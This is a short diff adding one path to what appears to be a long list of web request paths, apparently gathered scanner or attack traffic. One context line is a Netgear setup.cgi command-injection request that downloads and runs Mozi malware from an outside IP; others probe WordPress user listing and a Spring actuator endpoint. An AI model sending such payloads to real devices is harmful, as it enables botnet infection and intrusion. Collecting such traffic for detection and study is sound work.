@@ -25111,3 +25111,4 @@ http://64.233.170.113/
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://45.230.66.16:11700/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /wp-json/wp/v2/users/1
 /?srsltid=AfmBOoooj5CTs0ImZHtM4yMHCs5PuyV3nnCyHTmezqMdM78o_19tGvrd
+/api/actuator/gateway/routes
